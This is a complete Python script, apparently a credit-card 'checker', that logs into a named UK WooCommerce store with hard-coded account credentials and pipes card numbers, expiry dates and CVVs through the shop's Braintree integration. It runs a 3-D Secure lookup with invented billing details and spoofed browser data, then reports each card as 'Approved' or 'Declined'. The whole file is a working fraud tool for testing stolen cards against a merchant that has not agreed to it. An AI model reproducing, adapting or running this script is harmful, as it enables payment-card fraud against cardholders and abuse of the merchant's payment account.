import base64
import uuid
from requests import Session

def CutQuery(text,Luno,Ldos): return (text.split(Luno))[1].split(Ldos)[0]


def VBV3D(cards):
    try:
        session = Session()

        ccs = cards.split('|')

        headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36'}
        Req1 = session.get('https://www.luminati.co.uk/my-account/payment-methods/', headers=headers)
        login_nonce  = CutQuery(Req1.text,' name="woocommerce-login-nonce" value="','"')
        
        headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','content-type': 'application/x-www-form-urlencoded','origin': 'https://www.luminati.co.uk','referer': 'https://www.luminati.co.uk/my-account/payment-methods/','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',}
        data = {'username': 'sohayeg260@movfull.com','password': 'yEDH27BG4f6Ad4a','woocommerce-login-nonce': login_nonce,'_wp_http_referer': '/my-account/payment-methods/','login': 'Log in'}
        session.post('https://www.luminati.co.uk/my-account/payment-methods/',  headers=headers, data=data)
        
        headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','referer': 'https://www.luminati.co.uk/my-account/payment-methods/','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36'}
        Req2 = session.get('https://www.luminati.co.uk/my-account/add-payment-method/', headers=headers)
        
        nonce_add_payment = CutQuery(Req2.text,'name="woocommerce-add-payment-method-nonce" value="','"')
        token_bear = CutQuery(Req2.text,'wc_braintree_client_token = ["','"]')

        token_bear_final = base64.b64decode(token_bear).decode('utf-8')
        authorizationFingerprint = CutQuery(token_bear_final,'authorizationFingerprint":"','"')
        
        headers = {'authorization': 'Bearer '+authorizationFingerprint,'braintree-version': '2018-05-10','content-type': 'application/json','origin': 'https://assets.braintreegateway.com','referer': 'https://assets.braintreegateway.com/','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36'}

        sessionId = str(uuid.uuid4())
        json_data = {
                    'clientSdkMetadata': {
                        'source': 'client',
                        'integration': 'custom',
                        'sessionId': sessionId,
                    },
                    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
                    'variables': {
                        'input': {
                            'creditCard': {
                                'number': ccs[0],
                                'expirationMonth': ccs[1],
                                'expirationYear': ccs[2],
                                'cvv': ccs[3],
                                'billingAddress': {
                                    'postalCode': '10010',
                                    'streetAddress': 'E Little York Rd 7912',
                                },
                            },
                            'options': {
                                'validate': False,
                            },
                        },
                    },
                    'operationName': 'TokenizeCreditCard',
                }

        Req3 = session.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
        token_card = Req3.json()['data']['tokenizeCreditCard']['token']
        
        headers = {'content-type': 'application/json','origin': 'https://www.luminati.co.uk','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36'}
        
        json_data = {
        'amount': '0.00',
        'browserColorDepth': 24,
        'browserJavaEnabled': False,
        'browserJavascriptEnabled': True,
        'browserLanguage': 'es-ES',
        'browserScreenHeight': 1080,
        'browserScreenWidth': 1920,
        'browserTimeZone': 300,
        'deviceChannel': 'Browser',
        'additionalInfo': {
            'ipAddress': '190.121.131.76',
            'billingLine1': 'E Little York Rd 7912',
            'billingLine2': '',
            'billingCity': 'Norman',
            'billingState': 'CA',
            'billingPostalCode': '10010',
            'billingCountryCode': 'US',
            'billingPhoneNumber': '8194544131',
            'billingGivenName': 'Lucas',
            'billingSurname': 'Lorenzo',
            'email': 'sohayeg260@movfull.com',
        },
        'challengeRequested': True,
        'bin': ccs[0][0:6],
        'dfReferenceId': '0_1da79d90-d797-477d-b2d7-ffa04225609a',
        'clientMetadata': {
            'requestedThreeDSecureVersion': '2',
            'sdkVersion': 'web/3.106.0',
            'cardinalDeviceDataCollectionTimeElapsed': 2760,
            'issuerDeviceDataCollectionTimeElapsed': 3755,
            'issuerDeviceDataCollectionResult': True,
        },
        'authorizationFingerprint': authorizationFingerprint,
        'braintreeLibraryVersion': 'braintree/web/3.106.0',
        '_meta': {
            'merchantAppId': 'www.luminati.co.uk',
            'platform': 'web',
            'sdkVersion': '3.106.0',
            'source': 'client',
            'integration': 'custom',
            'integrationType': 'custom',
            'sessionId': 'af6cda05-97d4-4bed-86c2-49abcc7418c0',
        },
    }

        response = session.post(f'https://api.braintreegateway.com/merchants/vsp2vyhg3cjfwt7w/client_api/v1/payment_methods/{token_card}/three_d_secure/lookup',headers=headers,json=json_data)

        status = response.json()['paymentMethod']['threeDSecureInfo']['status']
        enrolled = response.json()['paymentMethod']['threeDSecureInfo']['enrolled']

        if 'authenticate_successful' in status: return 'Approved! ✅', '{} | {}'.format(status,enrolled)
        elif 'authenticate_attempt_successful' in status: return 'Approved! ✅', '{} | {}'.format(status,enrolled)
        else: return 'Declined! ❌', '{} | {}'.format(status,enrolled)

    except: return 'Declined! ❌','challenge_required.'
   



ccs = input('ccs: ')
chk = VBV3D(ccs)
print(chk)
